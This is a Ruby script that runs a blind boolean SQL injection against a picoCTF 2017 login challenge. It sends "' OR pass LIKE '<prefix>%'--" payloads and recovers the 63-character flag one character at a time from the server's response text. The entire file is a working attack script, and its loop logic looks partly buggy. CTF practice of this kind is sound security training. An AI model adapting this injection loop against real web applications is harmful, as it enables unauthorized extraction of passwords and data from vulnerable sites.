#!/usr/bin/env ruby
require "net/http"
require "uri"
require "colorize"

def check(password)
  headers = {
    'Content-Type' => 'application/x-www-form-urlencoded',
  }

  data = "username=admin&password=#{password}"

  uri = URI.parse("http://shell2017.picoctf.com/")
  req = Net::HTTP.new(uri.host, 35428)

  res = req.post(uri.path, data, headers)
  if res.code == 404
    return 404
  end
  if res.body.include? 'Login Functionality Not Complete. Flag is 63 characters'
    return 1
  else
    return 0
  end
end

chars = "qwertyuiopasdfghjklzxcvbnm7894561230_"
current_pass = ""
try = 0
chars_good = 0
start = Time.now
n = 0

while true
  n += 1
  ret = check("%27+OR+pass+LIKE+%27#{current_pass}%25%27--")
  if n == 1
    ret = 0
  end
  if ret == 1
    puts "#{n}. #{(Time.now - start).round}s #{current_pass} | #{current_pass.length} | #{try} | => Correct Char => #{chars_good} | [#{"+" * chars_good + "-" * (63 - chars_good)}]".green
  elsif ret == 0
    puts "#{n}. #{(Time.now - start).round}s #{current_pass} | #{current_pass.length} | #{try} | => Incorrect Char => #{chars_good} | [#{"+" * chars_good + "-" * (63 - chars_good)}]".yellow
  elsif ret == 404
    puts "Error 404".red
  elsif ret != 1 and ret != 0 and ret != 404
    puts "Unknown Error".red
  end
  if ret == 1
    current_pass = current_pass + chars[0]
  elsif ret == 0 and chars_good == 0
    current_pass = chars[try]
  elsif ret == 0 and chars_good != 0
    current_pass = current_pass[0..chars_good-1] + chars[try]
  end
  #ret = check("%27+OR+pass+LIKE+%27#{current_pass}%25%27--")
  if ret == 0
    try += 1
  elsif ret == 1
    try = 0
    chars_good += 1
  end
end
